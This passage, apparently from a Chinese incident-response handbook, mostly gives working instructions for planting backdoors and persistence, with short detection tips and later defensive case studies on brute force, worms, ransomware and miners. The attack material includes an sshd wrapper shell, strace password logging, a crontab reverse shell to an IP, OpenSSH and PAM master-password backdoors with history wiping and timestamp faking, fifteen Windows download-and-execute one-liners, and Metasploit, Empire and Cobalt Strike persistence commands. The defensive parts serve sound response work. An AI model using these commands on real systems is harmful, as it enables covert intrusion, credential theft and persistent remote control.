首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell 简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。 服务端： cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' &gt;sshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' &gt;&gt;sshd chmod u+x sshd /etc/init.d/sshd restart 客户端： socat STDIO TCP4:target_ip:22,sourceport=13377 #如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。 &gt;&gt;&gt; import struct &gt;&gt;&gt; buffer = struct.pack('&gt;I6',19526) &gt;&gt;&gt; print repr(buffer) '\\x00\\x00LF' &gt;&gt;&gt; buffer = struct.pack('&gt;I6',13377) &gt;&gt;&gt; print buffer 4A 排查技巧： # ls -al /usr/sbin/sshd # cat /usr/sbin/sshd 可通过重装ssh服务恢复。 6、strace后门 通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。 #vim /etc/bashrc alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh' # source /root/.bashrc 排查技巧：使用alias即可发现异常。 7、crontab反弹shell crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。 a、创建shell脚本，例如在/etc/evil.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345 0&gt;&amp;1 chmod +sx /etc/evil.sh b、crontab -e 设置定时任务 #每一分钟执行一次 */1 * * * * root /etc/evil.sh 重启crond服务，service crond restart，然后就可以用nc接收shell。 排查技巧： # 查看可疑的定时任务列表 crontab -e 8、openssh后门 利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。 a、备份SSH配置文件 mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old b、解压并安装补丁 tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1 cd openssh-5.9p1 patch &lt; sshbd5.9p1.diff c、记录用户名和密码的文件位置及其密码 vi includes.h #define ILOG \"/tmp/1.txt\" //记录登录本机的用户名和密码 #define OLOG \"/tmp/2.txt\" //记录本机登录远程的用户名和密码 #define SECRETPW \"123456789\" //后门的密码 d、修改版本信息 vi version.h #define SSH_VERSION \"填入之前记下来的版本号,伪装原版本\" #define SSH_PORTABLE \"小版本号\" e、安装并编译 ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 make clean make &amp;&amp; make install service sshd restart f、对比原来的配置文件，使配置文件一致，然后修改文件日期。 touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config g、清除操作记录 export HISTFILE=/dev/null export HISTSIZE=0 echo &gt;/root/.bash_history //清空操作日志 排查技巧：利用strace找出ssh后门. # 1、获取可疑进程PI ps aux | grep sshd # 2、跟踪sshd PID strace -o aa -ff -p PID # 3、查看记录密码打开文件 grep open sshd* | grep -v -e No -e null -e denied| grep WR 9、PAM后门 PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。 利用方法: 1、获取目标系统所使用的PAM版本，下载对应版本的pam版本 2、解压缩，修改pam_unix_auth.c文件，添加万能密码 3、编译安装PAM 4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。 排查技巧： # 1、通过Strace跟踪ssh ps axu | grep sshd strace -o aa -ff -p PID grep open aa* | grep -v -e No -e null -e denied| grep WR # 2、检查pam_unix.so的修改时间 stat /lib/security/pam_unix.so #32位 stat /lib64/security/pam_unix.so #64位 10、rookit后门 Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。 利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。 连接后的截图： 排查技巧：查看端口是否异常，RPM check查看命令是否被替换。 参考链接： LINUX的两种后门总结(suid shell与inetd) https://www.cnblogs.com/milantgh/p/3601812.html linux后门总结 https://www.cnblogs.com/zaqzzz/p/12099463.html https://www.secpulse.com/archives/100484.html linux各种一句话反弹shell总结 https://yq.aliyun.com/articles/519250?type=2 Linux OpenSSH后门的添加与防范 https://yq.aliyun.com/articles/69350 Linux后门整理合集 https://www.cnblogs.com/maplered/p/9224617.html https://www.cnblogs.com/zlgxzswjy/p/6209571.html linux 后门 https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/ 第5篇：Windows命令行文件下载方式汇总当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？ 一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式**。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。 在这里，**本文收集了15种常见的文件下载执行的方式，并结合具体案例**，让我们一起来看看是怎么实现的吧。 PowerShell Bitsadmin certutil wget ipc$文件共享 FTP TFTP WinScp msiexec IEExec mshta rundll32 regsvr32 MSXSL.EXE pubprn.vbs 1、PowerShell PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。 远程下载文件保存在本地： powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe') 远程执行命令： powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\" 2、Bitsadmin bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\\test\\1.txt 输入以上命令，成功下载文件。 3、certutil 用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。 注：缓存目录为：”%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content” #下载文件 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php #删除缓存 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete 4、wget Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。 wget.exe下载：https://eternallybored.org/misc/wget/ wget -O \"evil.txt\" http://192.168.28.128/imag/evil.txt 5、ipc$文件共享 IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 #建立远程IPC连接 net use \\\\192.168.28.128\\ipc$ /user:administrator \"abc123!\" #复制远程文件到本地主机 copy \\\\192.168.28.128\\c$\\2.txt D:\\test *6、FTP * 一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。 ftp 127.0.0.1 username password get file exit 7、TFTP 用来下载远程文件的最简单的网络协议，它基于UDP协议而实现 tftp32服务端下载地址：http://tftpd32.jounin.net/tftpd32_download.html tftp -i 你的IP get 要下载文件 存放位置 8、WinScp WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。 #上传 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"put D:\\1.txt /tmp/\" \"exit\" /log=log_file.txt #下载 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"get /tmp D:\\test\\app\\\" \"exit\" /log=log_file.tx 使用winscp.exe 作为命令行参数执行远程上传/下载操作。 9、msiexec msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行： #生成msi包 msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi &gt; evil.msi #远程执行 msiexec /q /i http://192.168.28.128/evil.msi 成功添加了一个test用户： 10、IEExec IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。 生成Payload： msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe 使用管理员身份打开cmd，分别运行下面两条命令。 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727&gt;caspol.exe -s off C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe 11、mshta mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。 mshta http://192.168.28.128/run.hta run.hta内容如下： &lt;HTML&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt; &lt;HEAD&gt; &lt;script language=\"VBScript\"&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(\"Wscript.Shell\") objShell.Run \"cmd.exe /c net user test password /add\" // 这里填写命令 self.close &lt;/script&gt; &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt; &lt;/HTML&gt; 12、rundll32 其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。 项目地址：https://github.com/Hood3dRob1n/JSRat-Py.git 步骤一：开始运行JSRat，监听本地8888端口。 步骤二：通过url访问，可以查看恶意代码。 复制代码如下： rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.28.131:8888/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);} 步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示： *13、regsvr32 * Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行 在目标机上执行： regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll 可以通过自己构造.sct文件，去下载执行我们的程序 &lt;?XML version=\"1.0\"?&gt; &lt;scriptlet&gt; &lt;registration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" &gt; &lt;script language=\"JScript\"&gt; &lt;![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]&gt; &lt;/script&gt; &lt;/registration&gt; &lt;/scriptlet&gt; 执行命令，成功弹计算器： 14、MSXSL.EXE msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。 下载地址为：https://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下： msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml &lt;?xml version=\"1.0\"?&gt; &lt;?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?&gt; &lt;customers&gt; &lt;customer&gt; &lt;name&gt;Microsoft&lt;/name&gt; &lt;/customer&gt; &lt;/customers&gt; exec.xsl &lt;?xml version='1.0'?&gt; &lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"&gt; &lt;msxsl:script language=\"JScript\" implements-prefix=\"user\"&gt; function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); return nodelist.nextNode().xml; } &lt;/msxsl:script&gt; &lt;xsl:template match=\"/\"&gt; &lt;xsl:value-of select=\"user:xml(.)\"/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 15、pubprn.vbs 在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject() \"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct &lt;?XML version=\"1.0\"?&gt; &lt;scriptlet&gt; &lt;registration description=\"Bandit\" progid=\"Bandit\" version=\"1.00\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" remotable=\"true\" &gt; &lt;/registration&gt; &lt;script language=\"JScript\"&gt; &lt;![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]&gt; &lt;/script&gt; &lt;/scriptlet&gt; 参考文章： https://xz.aliyun.com/t/1654/ https://evi1cg.me/archives/remote_exec.html 收集整理的15种文件下载的方式 https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A Windows执行命令与下载文件总结 https://www.cnblogs.com/17bdw/p/8550189.html 在windows上执行恶意代码 by rundll32 &amp; regsvr32 https://www.jianshu.com/p/e8f65deac245 IEexec.exe执行payload https://www.codercto.com/a/104908.html rundll32.exe 多种方法绕过白名单 https://www.cnblogs.com/backlion/p/10488747.html 第6篇：三大渗透测试框架权限维持技术0x00 前言在渗透测试中，有三个非常经典的渗透测试框架—-Metasploit、Empire、Cobalt Strike。 那么，通过漏洞获取到目标主机权限后，如何利用框架获得持久性权限呢？ 0x01 MSF权限维持使用MSF维持权限的前提是先获得一个meterpreter shell，通过meterpreter shell获取持久性shell的方法有两种： Persistence模块 通过启动项启动(persistence)的方式，在目标机器上以反弹回连。 -U：设置后门在用户登录后自启动。该方式会在HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run下添加注册表信息。推荐使用该参数； -X：设置后门在系统启动后自启动。该方式会在HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。 -S：作为服务自动启动代理程序（具有SYSTEM权限） 生成的相关文件位置 ： # 后门文件位置： C:\\Windows\\Temp C:\\Users\\Administrator\\AppData\\Local\\Temp # 注册表位置： HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Metsvc 模块 通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务，等待连接。 后门排查：目标主机上开启了一个Meterpreter服务。 0x02 Empire 权限维持Empire的persistence模块提供了18种权限维持的方法，大致可以分为四类，即 elevated（管理权限） misc（杂项） powerbreach userland（用户权限） registry* add_netuser deaduser backdoor_lnk schtasks* add_sid_history* eventlog* registry wmi* debugger* resolver schtasks wmi_updater* disable_machine_acct_change* get_ssps install_ssp* memssp* skeleton_key* 注册表 (Empire: agents) &gt; agents (Empire: agents) &gt; interact URL3FZBV (Empire: URL3FZBV) &gt; usemodule persistence/elevated/registry* (Empire: powershell/persistence/elevated/registry) &gt; set Listener test (Empire: powershell/persistence/elevated/registry) &gt; execute 因为是开机启动，所以会弹个黑框，之后还会弹出注册表添加的powershell启动项的框，在注册表位置如下： 计划任务 (Empire: agents) &gt; interact 9NZ2RWBC (Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/schtasks* (Empire: powershell/persistence/elevated/schtasks) &gt; set Listener test (Empire: powershell/persistence/elevated/schtasks) &gt; set DailyTime 22:50 (Empire: powershell/persistence/elevated/schtasks) &gt; execute 在任务计划程序库可以看到-任务为Updater-启动程序如下可以到为powershell wmi (Empire: agents) &gt; interact 9NZ2RWBC (Empire: 9NZ2RWBC) &gt; usemodule persistence/elevated/wmi (Empire: powershell/persistence/elevated/wmi) &gt; set Listener test (Empire: powershell/persistence/elevated/wmi) &gt; run 如何清除后门，最简单的方法就是使用Autoruns，选择WMI选项卡，右键就可以删除恶意后门。 0x03 Cobalt Strike权限维持通过Cobalt Strike拿到一个shell，留后门的方法有很多，下面介绍两种比较常见的无文件、自启动后门。 从Cobalt Strike菜单栏，Attacks–Web Drive-by–Scaripted Web Delivery，生成powershell后门。 根据需要可以自己选择，填写所需参数默认端口是80（需要注意的就是不要使用重复端口），Type选择powershell。 点击Launch后，返回powershell远程下载执行命令。 服务自启动后门 sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" //设置服务的描述字符串 sc config Name start= auto //设置这个服务为自动启动 net start Name //启动服务 重启服务器后，成功返回一个shell。 注册表自启动 在windows启动项注册表里面添加一个木马程序路径，如： beacon&gt;getsystem beacon&gt;shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" /f 账号注销后，重新登录，界面上会出现powershell快速闪过消失，成功返回shell。 注册表还有哪些键值可以设置为自启动： HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 0x04 结束语本文简单介绍了通过三大渗透框架进行权限维持的几种方法，了解攻击者常用的渗透框架及后门技术，有助于更好地去发现并解决服务器安全问题。 第7篇：常见WebShell管理工具攻击者在入侵网站时，通常要通过各种方式写入Webshell，从而获得服务器的控制权限，比如执行系统命令、读取配置文件、窃取用户数据，篡改网站页面等操作。 本文介绍十款常用的Webshell管理工具，以供你选择，你会选择哪一个？ 1、中国菜刀(Chopper) 中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。 2、蚁剑(AntSword) AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。 github项目地址：https://github.com/AntSwordProject/antSword 3、C刀(Cknife) 这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义。 github项目地址：https://github.com/Chora10/Cknife 4、冰蝎(Behinder) 冰蝎”是一款动态二进制加密网站管理客户端。 github地址：https://github.com/rebeyond/Behinder 5、Xise XISE WebShell管理工具。 6、Altman Altman3是一款渗透测试软件，基于.Net4.0开发，依托Eto.Form可以完美运行在Windows、Linux、Mac等多个平台。 github项目地址：https://github.com/keepwn/Altman 7、Weevely Weevely是一种Python编写的webshell管理工具，跨平台，只支持PHP。 github项目地址：https://github.com/epinna/weevely3 用法示例： weevely generate &lt;password&gt; &lt;path&gt; weevely &lt;URL&gt; &lt;password&gt; [cmd] 同时，在Kali 2.0 版本下，集成了三款Web后门工具：WebaCoo、weevely、PHP Meterpreter。 8、QuasiBot QuasiBot是一款php编写的webshell管理工具，可以对webshell进行远程批量管理。 github项目地址：https://github.com/Smaash/quasibot 9、Webshell-Sniper 这是一款基于终端的webshell管理工具，仅支持在类Unix系统上运行。 github项目地址：https://github.com/WangYihang/Webshell-Sniper 用法示例： Usage : python webshell-sniper.py [URL] [METHOD] [AUTH] Example : python webshell-sniper.py http://127.0.0.1/c.php POST c 10、WebshellManager 一款用PHP+Mysql写的一句话WEB端管理工具，目前仅支持对PHP的一句话进行操作。 github项目地址：https://github.com/boy-hack/WebshellManager 我在知识星球发起了一个小讨论，也收集到了一些webshell管理工具，如 hatchet、K8飞刀、lanker，欢迎补充。 第四章：Windows实战篇第1篇：FTP暴力破解0x00 前言​ FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。 0x01 应急场景​ 从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录： 0x02 日志分析安全日志分析： 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。 打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解： 进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图： 这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？ 登录类型8：网络明文（NetworkCleartext） 这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。 我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。 另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP： 通过对近段时间的管理员登录日志进行分析，如下： 管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。 另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。 应急处理措施：1、关闭外网FTP端口映射 2、删除本地服务器FTP测试 0x04 处理措施​ FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施： 1、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。 2、更改服务器FTP默认端口。 3、部署入侵检测设备，增强安全防护。 第2篇：蠕虫病毒0x00 前言​ 蠕虫病毒是一种十分古老的计算机病毒，它是一种自包含的程序（或是一套程序），通常通过网络途径传播，每入侵到一台新的计算机，它就在这台计算机上复制自己，并自动执行它自身的程序。 常见的蠕虫病毒：熊猫烧香病毒 、冲击波/震荡波病毒、conficker病毒等。 0x01 应急场景​ 某天早上，管理员在出口防火墙发现内网服务器不断向境外IP发起主动连接，内网环境，无法连通外网，无图脑补。 0x02 事件分析在出口防火墙看到的服务器内网IP，首先将中病毒的主机从内网断开，然后登录该服务器，打开D盾_web查杀查看端口连接情况，可以发现本地向外网IP发起大量的主动连接： 通过端口异常，跟踪进程ID，可以找到该异常由svchost.exe windows服务主进程引起，svchost.exe向大量远程IP的445端口发送请求： 这里我们推测可以系统进程被病毒感染，使用卡巴斯基病毒查杀工具，对全盘文件进行查杀，发现c:\\windows\\system32\\qntofmhz.dll异常： 使用多引擎在线病毒扫描（http://www.virscan.org/） 对该文件进行扫描: 确认服务器感染conficker蠕虫病毒，下载conficker蠕虫专杀工具对服务器进行清查，成功清楚病毒。 大致的处理流程如下: 1、发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接 2、病毒查杀：卡巴斯基全盘扫描，发现异常文件 3、确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。 4、病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。 0x04 预防处理措施​ 在政府、医院内网，依然存在着一些很古老的感染性病毒，如何保护电脑不受病毒感染，总结了几种预防措施： 1、安装杀毒软件，定期全盘扫描 2、不使用来历不明的软件，不随意接入未经查杀的U盘 3、定期对windows系统漏洞进行修复，不给病毒可乘之机 4、做好重要文件的备份，备份，备份。 第3篇：勒索病毒0x00 前言​ 勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。 0x01 应急场景​ 某天早上，网站管理员打开OA系统，首页访问异常，显示乱码： 0x02 事件分析​ 登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本： 打开!HELP_SOS.hta文件，显示如下： 到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。 绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 遇到了，别急，试一试勒索病毒解密工具： “拒绝勒索软件”网站 https://www.nomoreransom.org/zh/index.html 360安全卫士勒索病毒专题 http://lesuobingdu.360.cn 0x04 防范措施​ 一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施： 1、安装杀毒软件，保持监控开启，定期全盘扫描 2、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口 3、及时更新web漏洞补丁，升级web组件 4、备份。重要的资料一定要备份，谨防资料丢失 5、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开 第4篇：ARP病毒0x00 前言 ARP病毒并不是某一种病毒的名称，而是对利用arp协议的漏洞进行传播的一类病毒的总称，目前在局域网中较为常见。发作的时候会向全网发送伪造的ARP数据包，严重干扰全网的正常运行，其危害甚至比一些蠕虫病毒还要严重得多。 0x01 应急场景 某天早上，小伙伴给我发了一个微信，说192.168.64.76 CPU现在负载很高，在日志分析平台查看了一下这台服务器的相关日志，流量在某个时间点暴涨，发现大量137端口的UDP攻击。 0x02 分析过程 登录服务器，首先查看137端口对应的进程，进程ID为4对应的进程是SYSTEM，于是使用杀毒软件进行全盘查杀。 卡巴斯基绿色版：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe 卡巴斯基、360杀毒、McAfee查杀无果，手工将启动项、计划任务、服务项都翻了一遍，并未发现异常。本地下载了IpTool抓包工具，筛选条件： 协议 UDP 端口 137 可以明显的看出192.168.64.76发送的数据包是异常的，192.168.64.76的数据包目的地址，一直在变，目的MAC是不变的，而这个MAC地址就是网关的MAC。 端口137的udp包是netbios的广播包，猜测：可能是ARP病毒，由本机对外的ARP攻击。 采用措施：通过借助一些安全软件来实现局域网ARP检测及防御功能。 服务器安全狗Windows版下载：http://free.safedog.cn/server_safedog.html 网络防火墙–攻击防护–ARP防火墙： 虽然有拦截了部分ARP请求，但流量出口还是有一些137 UDF的数据包。 看来还是得下狠招，关闭137端口：禁用TCP/IP上的NetBIOS。 1）、禁用Server服务 2）、禁用 TCP/IP 上的 NetBIOS 设置完，不用重启即可生效，137端口关闭，观察了一会，对外发起的请求已消失，CPU和网络带宽恢复正常。 0x04 防护措施 局域网安全防护依然是一项很艰巨的任务，网络的安全策略，个人/服务器的防毒机制，可以在一定程度上防止病毒入侵。 另外不管是个人PC还是服务器，总还是需要做一些基本的安全防护：1、关闭135/137/138/139/445等端口 2、更新系统补丁。 第5篇：挖矿病毒（一）0x00 前言​ 随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。 0x01 应急场景​ 某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。 0x02 事件分析​ 登录网站服务器进行排查，发现多个异常进程： 分析进程参数： wmic process get caption,commandline /value &gt;&gt; tmp.txt TIPS: 在windows下查看某个运行程序（或进程）的命令行参数 使用下面的命令： wmic process get caption,commandline /value 如果想查询某一个进程的命令行参数，使用下列方式： wmic process where caption=”svchost.exe” get caption,commandline /value 这样就可以得到进程的可执行文件位置等信息。 访问该链接： Temp目录下发现Carbon、run.bat挖矿程序: 具体技术分析细节详见： 360CERT：利用WebLogic漏洞挖矿事件分析 https://www.anquanke.com/post/id/92223 清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。 临时防护方案 根据实际环境路径，删除WebLogic程序下列war包及目录 rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war rm -f 